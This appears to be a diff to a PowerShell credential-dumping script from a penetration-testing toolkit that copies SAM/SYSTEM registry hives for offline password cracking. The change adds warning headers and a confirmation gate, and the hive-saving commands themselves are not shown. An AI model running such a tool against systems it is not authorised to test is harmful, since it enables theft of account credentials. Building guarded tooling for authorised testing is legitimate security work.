@@ -1,12 +1,20 @@
 # gather/windows/hashdump.ps1 — Dump SAM/SYSTEM hives for offline cracking
 # Requires: Local Administrator
 # Read-only: NO — creates hive copies (state-changing, documented)
+# Sensitive-output: YES — may print credential material or credential-bearing artifacts
+# Pattern: EVIDENCE → SAVE HIVES → VERIFY/HANDOFF
+# Confirmation: set $ConfirmDump = $true before running
 # MITRE ATT&CK: T1003.002 — SAM Registry
 
 $ErrorActionPreference = 'SilentlyContinue'
 
 function Sec($n) { Write-Output "`n=== $n ===" }
 function Run($c) { Write-Output "PS> $c"; Invoke-Expression $c }
+
+if (-not (Get-Variable -Name ConfirmDump -ErrorAction SilentlyContinue) -or -not $ConfirmDump) {
+    Write-Error "Set `$ConfirmDump = `$true before running; this writes SAM/SYSTEM/SECURITY hive copies to the target."
+    exit 1
+}
 
 Sec 'SAM_SYSTEM_HIVE_DUMP'
 Write-Output "[!] State-changing: saves registry hives to C:\Windows\Temp"
